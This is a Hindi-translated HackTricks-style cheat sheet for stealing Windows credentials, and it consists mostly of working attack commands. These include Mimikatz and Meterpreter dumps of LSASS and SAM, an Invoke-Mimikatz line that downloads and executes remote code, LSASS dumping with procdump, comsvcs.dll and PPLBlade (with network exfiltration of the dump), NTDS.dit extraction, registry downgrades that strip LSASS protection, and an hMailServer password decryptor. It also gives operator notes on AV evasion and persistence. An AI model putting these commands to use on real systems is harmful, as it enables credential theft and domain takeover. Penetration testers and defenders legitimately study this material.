# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz द्वारा किए जा सकने वाले अन्य कार्यों को इस पृष्ठ में देखें** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials निकालने से रोक सकते हैं।**

## Credentials के साथ Meterpreter

इस [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का उपयोग **जो** मैंने बनाया है, victim के अंदर **passwords and hashes** खोजने के लिए करें।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

चूँकि **Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, इसलिए इसे Defender द्वारा पहचाना नहीं जाता।\
आप इस टूल का उपयोग कर सकते हैं **dump the lsass process**, **download the dump** और **extract** the **credentials locally** from the dump.

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) के साथ स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: कुछ **AV** **procdump.exe to dump lsass.exe** के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, यह इसलिए है क्योंकि वे **"procdump.exe" and "lsass.exe"** string को **detect** कर रहे हैं। इसलिए lsass.exe के नाम के बजाय procdump को lsass.exe का **PID** एक **argument** के रूप में **pass** करना अधिक **stealthier** होगा।

### lsass को **comsvcs.dll** से dump करना

एक DLL जिसका नाम **comsvcs.dll** है और जो `C:\Windows\System32` में पाया जाता है, crash की स्थिति में **dumping process memory** के लिए जिम्मेदार है। इस DLL में **`MiniDumpW`** नामक एक **function** शामिल है, जिसे `rundll32.exe` के जरिए invoke करने के लिए डिज़ाइन किया गया है।\
पहले दो arguments का उपयोग अप्रासंगिक है, लेकिन तीसरा argument तीन घटकों में विभाजित होता है। जिस process ID को dump करना है वह पहला घटक है, dump फ़ाइल का स्थान दूसरा घटक है, और तीसरा घटक सख़्त तौर पर शब्द **full** है। कोई वैकल्पिक विकल्प मौजूद नहीं है।\
इन तीनों घटकों को parse करने के बाद, DLL dump फ़ाइल बनाना और निर्दिष्ट process की memory को इस फ़ाइल में स्थानांतरित करना आरम्भ कर देता है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए किया जा सकता है, जिससे procdump को upload और execute करने की आवश्यकता समाप्त हो जाती है। इस विधि का विस्तार से वर्णन [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) पर किया गया है।

निम्नलिखित कमांड निष्पादन के लिए उपयोग की जाती है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को [**lssasy**](https://github.com/Hackndo/lsassy) के साथ स्वचालित कर सकते हैं।**

### **Task Manager के साथ lsass को डंप करना**

1. Task Bar पर राइट‑क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रोसेस खोजें
4. "Local Security Authority Process" प्रोसेस पर राइट‑क्लिक करें और "Create dump file" पर क्लिक करें।

### procdump के साथ lsass को डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा साइन किया गया एक बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass का डंप

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो memory dump को obfuscate करने और उसे remote workstations पर बिना disk पर drop किए transfer करने का समर्थन करती है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को बाइपास करना
2. memory dump files को obfuscate करके Defender की सिग्नेचर-आधारित डिटेक्शन मेकेनिज़्म से बचना
3. memory dump को RAW और SMB upload methods के साथ बिना disk पर drop किए upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-आधारित LSASS dumping बिना MiniDumpWriteDump के

Ink Dragon एक तीन-स्टेज dumper भेजता है जिसका नाम **LalsDumper** है और यह कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर EDR hooks कभी ट्रिगर नहीं होते:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 छोटे अक्षर `d` वाले placeholder की खोज करता है, उसे `rtu.txt` के absolute path से overwrite करता है, patched DLL को `nfdp.dll` के रूप में सेव करता है, और `AddSecurityPackageA("nfdp","fdp")` को कॉल करता है। इससे **LSASS** को malicious DLL को एक नए Security Support Provider (SSP) के रूप में लोड करने के लिए मजबूर किया जाता है।
2. **Stage 2 inside LSASS** – जब LSASS `nfdp.dll` को लोड करता है, तो DLL `rtu.txt` पढ़ता है, प्रत्येक बाइट को `0x20` के साथ XORs करता है, और निष्पादन स्थानांतरित करने से पहले डिकोड किए गए ब्लॉब को मेमोरी में मैप करता है।
3. **Stage 3 dumper** – मैप्ड payload MiniDump लॉजिक को फिर से लागू करता है using direct syscalls जिन्हें hashed API names से resolve किया गया है (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). एक समर्पित export जिसका नाम `Tom` है `%TEMP%\<pid>.ddt` खोलता है, एक compressed LSASS dump फ़ाइल में स्ट्रीम करता है, और हैंडल बंद कर देता है ताकि बाद में exfiltration हो सके।

ऑपरेटर नोट्स:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को उसी डायरेक्टरी में रखें। Stage 1 हार्ड‑कोडेड placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने से चेन टूट जाएगी।
* Registration `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में जोड़कर होती है। आप LSASS को हर बूट पर SSP reload करवाने के लिए उस वैल्यू को खुद seed कर सकते हैं।
* `%TEMP%\*.ddt` फ़ाइलें compressed dumps हैं। उन्हें लोकली decompress करें, फिर credential extraction के लिए Mimikatz/Volatility में फीड करें।
* `lals.exe` चलाने के लिए admin/SeTcb अधिकार चाहिए ताकि `AddSecurityPackageA` सफल हो; एक बार कॉल वापस आ जाने पर, LSASS transparently rogue SSP को लोड करता है और Stage 2 को execute करता है।
* डिस्क से DLL हटाने से वह LSASS से evict नहीं होता। या तो रजिस्ट्री एंट्री हटाकर LSASS को restart करें (reboot) या इसे long-term persistence के लिए छोड़ दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit निकालें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्ष्य DC से NTDS.dit का पासवर्ड इतिहास Dump करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit अकाउंट के लिए pwdLastSet attribute दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ में **स्थित** होनी चाहिए। लेकिन आप इन्हें **सामान्य तरीके से बस कॉपी नहीं कर सकते** क्योंकि ये संरक्षित हैं।

### From Registry

उन फाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से उनकी एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** उन फ़ाइलों को अपने Kali मशीन पर रखें और **extract the hashes** करने के लिए उपयोग करें:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके संरक्षित फ़ाइलों को कॉपी कर सकते हैं। आपको Administrator होना आवश्यक है।

#### vssadmin का उपयोग

vssadmin binary केवल Windows Server संस्करणों में उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप यह वही काम **Powershell** से भी कर सकते हैं। यह **कैसे SAM file को कॉपी करें** का एक उदाहरण है (उपयोग किया गया हार्ड ड्राइव "C:" है और इसे C:\users\Public में सेव किया गया है), लेकिन आप इसे किसी भी सुरक्षित फ़ाइल को कॉपी करने के लिए उपयोग कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
पुस्तक से कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक कॉपी बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file को **Active Directory** का हृदय माना जाता है, जो user objects, groups और उनकी memberships के बारे में महत्वपूर्ण डेटा रखता है। यही वह स्थान है जहाँ domain users के **password hashes** संग्रहीत होते हैं। यह फाइल एक **Extensible Storage Engine (ESE)** डेटाबेस है और **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित है।

इस डेटाबेस में तीन प्रमुख तालिकाएँ रखी जाती हैं:

- **Data Table**: यह table users और groups जैसे ऑब्जेक्ट्स के विवरण को स्टोर करने के लिए जिम्मेदार है।
- **Link Table**: यह रिश्तों का ट्रैक रखता है, जैसे group memberships।
- **SD Table**: प्रत्येक ऑब्जेक्ट के लिए **Security descriptors** यहीं रखे जाते हैं, जो स्टोर किए गए ऑब्जेक्ट्स की सुरक्षा और access control सुनिश्चित करते हैं।

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows उस फ़ाइल के साथ इंटरैक्ट करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। फिर, **part** of the **NTDS.dit** file संभवतः **inside the `lsass`** memory में स्थित हो सकता है (आप शायद नवीनतम accessed डेटा पा सकेंगे क्योंकि performance सुधार के लिए **cache** का उपयोग होता है)।

#### NTDS.dit के अंदर hashes को डिक्रिप्ट करना

हैश को 3 बार साइफ़र किया गया/जाता है:

1. BOOTKEY और RC4 का उपयोग करके Password Encryption Key (**PEK**) को डिक्रिप्ट करें।
2. PEK और RC4 का उपयोग करके हैश को डिक्रिप्ट करें।
3. DES का उपयोग करके हैश को डिक्रिप्ट करें।

**PEK** का मान हर domain controller में समान होता है, लेकिन यह **NTDS.dit** फ़ाइल के अंदर domain controller की **SYSTEM** फ़ाइल के **BOOTKEY** का उपयोग करके सिफर किया जाता है (यह domain controllers के बीच अलग होता है)। इसलिए NTDS.dit फ़ाइल से credentials प्राप्त करने के लिए आपको फाइलें NTDS.dit और SYSTEM चाहिए (_C:\Windows\System32\config\SYSTEM_)।

### Copying NTDS.dit using Ntdsutil

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**volume shadow copy**](#stealing-sam-and-system) trick का उपयोग करके **ntds.dit** फ़ाइल की कॉपी भी बना सकते हैं। ध्यान रखें कि आपको **SYSTEM file** की भी एक कॉपी चाहिए होगी (फिर से, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick)।

### **NTDS.dit से hashes निकालना**

एक बार जब आपने फ़ाइलें **NTDS.dit** और **SYSTEM** **प्राप्त** कर ली हों, तो आप _secretsdump.py_ जैसे टूल का उपयोग करके **hashes निकाल** सकते हैं:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक वैध domain admin user का उपयोग करके इन्हें **स्वचालित रूप से निकाल** भी सकते हैं:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **बड़ी NTDS.dit फ़ाइलों** के लिए इसे निकालने के लिए [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करने की सलाह दी जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से डोमेन ऑब्जेक्ट्स को SQLite डेटाबेस में निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ SQLite डेटाबेस में निकाला जा सकता है। न केवल secrets निकाले जाते हैं बल्कि पूरे ऑब्जेक्ट्स और उनके attributes भी निकाले जाते हैं ताकि raw NTDS.dit फ़ाइल पहले से प्राप्त होने पर आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive वैकल्पिक है, लेकिन यह रहस्यों की डिक्रिप्शन की अनुमति देता है (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories)। अन्य जानकारी के साथ, निम्नलिखित डेटा निकाला जाता है: user और machine खाते (उनके hashes के साथ), UAC flags, अंतिम लॉगऑन और password change के लिए timestamp, accounts का description, नाम, UPN, SPN, groups और recursive memberships, organizational units का tree और membership, trusted domains जिनके साथ trusts का type, direction और attributes...

## Lazagne

बाइनरी को [here](https://github.com/AlessandroZ/LaZagne/releases) से डाउनलोड करें। आप इस binary का उपयोग कई सॉफ़्टवेयर से credentials निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के लिए अन्य टूल

### Windows credentials Editor (WCE)

यह टूल मेमोरी से credentials निकालने के लिए उपयोग किया जा सकता है। इसे डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फ़ाइल से credentials निकालता है
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **इसे चलाएँ** और पासवर्ड निकल जाएँगे।

## निष्क्रिय RDP सेशनों का उपयोग और सुरक्षा नियंत्रणों को कमजोर करना

Ink Dragon’s FinalDraft RAT में एक `DumpRDPHistory` tasker शामिल है, जिनकी तकनीकें किसी भी red-teamer के लिए उपयोगी हैं:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर प्रत्येक user hive को पार्स करें। प्रत्येक subkey में server name, `UsernameHint`, और last write timestamp स्टोर होता है। आप FinalDraft की लॉजिक को PowerShell से replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (successful logon) और **25** (disconnect) के लिए query करें ताकि पता लग सके किसने बॉक्स पर प्रशासन किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

एक बार जब आप जान लेते हैं कि कौन सा Domain Admin नियमित रूप से कनेक्ट होता है, तो उनके **disconnected** session अभी मौजूद रहते हुए LSASS dump करें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें फिर SMB/WinRM पर replay करके `NTDS.dit` कब्जा करने या domain controllers पर persistence स्टेज करने के लिए उपयोग किया जा सकता है।

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` RDP के दौरान पूर्ण credential/ticket reuse को मजबूर करता है, जिससे pass-the-hash style pivots सक्षम होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को अक्षम करता है ताकि local admins नेटवर्क पर unrestricted tokens प्राप्त कर सकें।
* `DSRMAdminLogonBehavior=2` DSRM administrator को तब भी log on करने देता है जब DC online हो, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections को हटाता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer database credentials (post-compromise)

hMailServer अपना DB password `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` में `[Database] Password=` के अंतर्गत स्टोर करता है। यह value Blowfish-encrypted है static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps के साथ। INI से hex string का उपयोग नीचे दिए गए Python snippet के साथ करें:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
clear-text password के साथ, SQL CE database की एक copy बनाकर file locks से बचें, 32-bit provider लोड करें, और hashes क्वेरी करने से पहले आवश्यकता होने पर upgrade करें:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` कॉलम hMailServer hash format (hashcat mode `1421`) का उपयोग करता है। इन मानों को क्रैक करने से WinRM/SSH pivots के लिए पुन: उपयोग योग्य credentials प्राप्त हो सकते हैं।

## संदर्भ

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
